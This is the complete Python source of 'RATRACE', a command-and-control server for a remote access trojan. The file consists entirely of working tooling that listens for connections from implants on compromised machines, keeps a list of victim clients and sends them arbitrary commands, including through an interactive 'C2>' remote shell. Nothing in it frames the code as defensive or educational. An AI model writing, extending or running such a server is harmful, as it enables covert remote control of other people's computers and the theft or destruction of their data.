import socket
import threading
import atexit
import signal
import os
import time
from pwn import log, str_input, options, splash

art = r"""______  ___ ___________  ___  _____  _____  / \____/ \        /  \
| ___ \/ _ \_   _| ___ \/ _ \/  __ \|  ___| \_      _/_______/ /\ \
| |_/ / /_\ \| | | |_/ / /_\ \ /  \/| |__     \O  O/          / //
|    /|  _  || | |    /|  _  | |    |  __|    |\__/          |  |
| |\ \| | | || | | |\ \| | | | \__/\| |___    |  ___| |___\  |   
\_| \_\_| |_/\_/ \_| \_\_| |_/\____/\____/     \ |  | /  \ \ /
================================================w====w====w=w======
0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0
==================================================================="""

class C2Server:
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.clients: list[socket.socket] = []
        self.current_client_index = 0
        self.running = True
        self.server = None
        self.listening = None

    def start(self):
        if self.server:
            self.server.close()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            s.bind((self.host, self.port))
            s.listen(10)
            s.settimeout(1.0)
            self.server = s

            self.listening = log.waitfor(f"{self.host}:{self.port} Status", status='Listening')
            self.listening.success()

            while self.running:
                try:
                    client_socket, addr = s.accept()
                    log.info(f"Accepted connection from {addr[0]}:{addr[1]}")
                    self.clients.append(client_socket)
                except socket.timeout:
                    continue
                except OSError:
                    break

    def stop(self):
        self.running = False

        if self.server:
            try:
                self.server.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            finally:
                self.server.close()
                self.server = None

        for client in self.clients[:]:
            try:
                client.close()
            except OSError:
                pass
            finally:
                self.clients.remove(client)

        if self.listening:
            self.listening.success()

    def select_client(self, choice):
        if not self.clients:
            return None
        self.current_client_index = choice
        return self.clients[self.current_client_index]

    def send_command(self, command):
        client = self.select_client(self.current_client_index)
        if not client:
            log.warning("[!] No active clients")
            return
        if command.strip() == "":
            return
        try:
            client.send(command.encode())
            time.sleep(0.01)
            response = client.recv(4096).decode()
            return response
        except Exception as e:
            log.warning(f"[!] Error: {e}")
            self.clients.remove(client)

    def remove_dead(self):
        alive_clients = []
        for client in self.clients:
            try:
                client.send("info".encode())
                client.settimeout(1)
                if client.recv(1024):
                    alive_clients.append(client)
            except (socket.error, ConnectionResetError):
                continue
        self.clients = alive_clients

if __name__ == "__main__":
    items = ["Start Server","Check Clients", "Connect to Client", "Exit"]
    running = False
    server = C2Server()
    server_thread = None

    atexit.register(server.stop)

    def handle_sigint(sig, frame):
        log.info("Caught CTRL + C, Shutting Down")
        server.stop()
        exit(0)
    signal.signal(signal.SIGINT, handle_sigint)

    def resetgui():
        input("\nPress enter to continue...")
        os.system("cls" if os.name == "nt" else "clear")
        
    def interactive():
        run = True
        runstatus = log.waitfor(f"Interactive mode | enter 'return' to quit | STATUS = ", status = "Commanding")
        while run:
            command = str_input('C2> ')
            if command == "return":
                    run = False
            else:
                output = server.send_command(command)
                log.info(output)
        runstatus.success()

    print(art)
    ratrace = True
    while ratrace:
        choice = options('Welcome to RATRACE - Make your Selection', items)
        if choice == 0:		#Start / Stop Server
            if not running:
                server.running = True
                server_thread = threading.Thread(target=server.start)
                server_thread.daemon = True
                server_thread.start()
                items[0] = "Stop Server"
                running = True
            elif running:
                server.stop()
                items[0] = "Start Server"
                running = False
        elif choice == 1: 	 #List Clients
            server.remove_dead()
            if len(server.clients) > 0:
                log.info("FORMAT: ('REMOTE ADDR', REMOTE PORT)")
                for client in server.clients:
                    format = str(client).split("raddr=")
                    format = format[1].strip(">")
                    log.info(format)
            else:
                log.info("No clients connected")
        elif choice == 2:	# Connect to a Client
                if len(server.clients) > 0:
                    server.remove_dead()
                    targets = []
                    for client in server.clients:
                        format = str(client).split("raddr=")
                        format = format[1].strip(">")
                        targets.append(format)
                    target = options('Select a client:', targets)
                    server.select_client(target)
                    implant = server.send_command("info").split(' ')
                    implant.append("interactive")
                    implant.append("return")
                    run = True
                    while run:
                        c2choice = (options(f'Connected to {implant[0]} on {targets[target]}', implant[1:]) + 1)
                        if implant[c2choice] != "return":
                            if implant[c2choice] == "interactive":
                                interactive()
                            else:
                                output = server.send_command(implant[c2choice])
                                log.info(output)
                            resetgui()
                        else:
                            log.info("Returning...\n")
                            run = False
                else:
                    log.info("No clients connected")
        else:
            server.stop()
            os.system("cls" if os.name == "nt" else "clear")
            ratrace = False
            splash()
        resetgui()